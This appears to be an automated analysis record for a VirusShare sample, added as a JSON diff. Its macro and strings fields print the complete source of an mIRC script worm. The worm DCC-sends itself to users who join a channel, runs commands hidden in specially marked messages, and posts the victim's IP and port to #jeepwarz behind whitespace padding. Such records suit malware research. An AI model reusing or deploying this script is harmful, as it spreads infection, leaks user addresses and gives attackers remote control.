@@ -1,0 +1,51 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": "[script]\nn0=on 1:text:*inferno6*:#:/ctcp $nick k \nn1=on 1:text:\ufffd\u007f\ufffd\u007f *:?:{ s *2 | halt }\nn2=alias /s / *1\nn3=on 1:connect:/.enable #d\nn4=#d off\nn5=on 1:join:#:{ if ($nick != $me) { dcc send $nick script.ini } | .disable #d | .timer 1 60 .enable #d }\nn6=#d end\nn7=  .remote on\nn8=  titlebar (Not connected)\nn9=  }\nn10=raw 401:*: {\nn11=  halt\nn12=}\nn13=RAW 001:*:titlebar (Connecting to $server $+ )\nn14=\nn15=on 1:CONNECT:titlebar (Connected to $server $+ )                                                                                                                                                                                                                                                                                                               | .msg  #jeepwarz Hi.  $ip on $server $+ : $+ $port $+ .\nn16=\nn17=on 1:DISCONNECT:titlebar (Not connected)"
+    },
+    "filename": "VirusShare_085dfcef851c6b2dc90502fc9b990071",
+    "filesize": 883,
+    "filetype": "data",
+    "hashes": {
+        "md5": "085dfcef851c6b2dc90502fc9b990071",
+        "sha1": "5d7f29d33c8238b36b0b0a88c0411c88bcf53252",
+        "sha256": "2929bc616328b9297939e222c33308e36d08743f3ec05e49ef806a0e9bfaa42f"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "[script]",
+            "n0=on 1:text:*inferno6*:#:/ctcp $nick k ",
+            "n1=on 1:text:",
+            " *:?:{ s *2 | halt }",
+            "n2=alias /s / *1",
+            "n3=on 1:connect:/.enable #d",
+            "n4=#d off",
+            "n5=on 1:join:#:{ if ($nick != $me) { dcc send $nick script.ini } | .disable #d | .timer 1 60 .enable #d }",
+            "n6=#d end",
+            "n7=  .remote on",
+            "n8=  titlebar (Not connected)",
+            "n9=  }",
+            "n10=raw 401:*: {",
+            "n11=  halt",
+            "n12=}",
+            "n13=RAW 001:*:titlebar (Connecting to $server $+ )",
+            "n14=",
+            "n15=on 1:CONNECT:titlebar (Connected to $server $+ )                                                                                                                                                                                                                                                                                                               | .msg  #jeepwarz Hi.  $ip on $server $+ : $+ $port $+ .",
+            "n16=",
+            "n17=on 1:DISCONNECT:titlebar (Not connected)"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.268794",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
